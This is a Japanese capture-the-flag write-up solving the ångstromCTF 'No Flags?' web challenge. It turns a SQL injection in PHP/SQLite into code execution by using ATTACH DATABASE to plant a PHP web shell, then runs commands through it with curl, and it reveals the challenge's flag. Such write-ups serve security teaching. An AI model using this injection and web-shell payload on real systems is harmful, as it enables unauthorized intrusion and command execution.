# No Flags?:Web:150pts
After hearing about all of the cheating scandals, clam decided to conduct a sting operation for ångstromCTF. He made [a database of fake flags](https://no-flags.web.actf.co/) to see who submits them. Unbeknownst to him, a spy managed to sneak a real flag into his database. Can you find it?  

[Source](index.php), [Dockerfile](Dockerfile)  

# Solution
URL、ソース、Dockerfileが配布されている。  
アクセスするとデータベースに自作のフラグを投稿できるサイトのようだ。  
No Flags?  
[site.png](site/site.png)  
ソースを見ると主要な部分は以下のようであった。  
```php
~~~
    <?php
        if (!isset($_SESSION["DBNAME"])) {
            $dbname = hash("sha256", (string) rand());
            $_SESSION["DBNAME"] = $dbname;
            $init = true;
        } else {
            $dbname = $_SESSION["DBNAME"];
            $init = false;
        }
        $pdo = new PDO("sqlite:/tmp/$dbname.db");
        if ($init) {
            $pdo->exec("CREATE TABLE Flags (flag string); INSERT INTO Flags VALUES ('actf{not_the_flag}'), ('actf{maybe_the_flag}')");
        }
        if (isset($_POST["flag"])) {
            $flag = $_POST["flag"];
            $pdo->exec("INSERT INTO Flags VALUES ('$flag');");
        }
        foreach ($pdo->query("SELECT * FROM Flags") as $row) {
            echo "<li>" . htmlspecialchars($row["flag"]) . "</li>";
        }
    ?>
~~~
```
自明なSQLiがあり、複文実行できそうだ。  
sqliteが使われていることもわかる。  
次にDockerfileを見ると以下のようであった。  
```dockerfile
FROM php:8.1.5-apache-bullseye

# executable that prints the flag
COPY printflag /printflag
RUN chmod 111 /printflag
COPY src /var/www/html

RUN chown -R root:root /var/www/html && chmod -R 555 /var/www/html
RUN mkdir /var/www/html/abyss &&\
    chown -R root:root /var/www/html/abyss &&\
    chmod -R 333 abyss

EXPOSE 80
```
`/printflag`を実行しなければならないようだ。  
SQLi2RCEを狙う。  
SQLiteでは書き込み可能な場所がある場合、任意のコードが実行できることがある。  
今回はDockerfileより、`/var/www/html/abyss`が書き込み可能かつwebよりアクセス可能なようだ。  
次のようなSQLiペイロードを投稿し、webshellを設置する。  
```sql
'); ATTACH DATABASE '/var/www/html/abyss/sato_hack.php' AS sato; CREATE TABLE sato.pwn (dataz text); INSERT INTO sato.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>'); -- satoki
```
設置し終わったら以下のようにコードを実行する。  
```bash
$ curl -s "https://no-flags.web.actf.co/abyss/sato_hack.php?cmd=id" | strings
SQLite format 3
Gtablepwnpwn
CREATE TABLE pwn (dataz text)
Iuid=33(www-data) gid=33(www-data) groups=33(www-data)
$ curl -s "https://no-flags.web.actf.co/abyss/sato_hack.php?cmd=/printflag" | strings
SQLite format 3
Gtablepwnpwn
CREATE TABLE pwn (dataz text)
Iactf{why_do_people_still_use_php}
```
指定された通り`/printflag`を実行するとflagが得られた。  

## actf{why_do_people_still_use_php}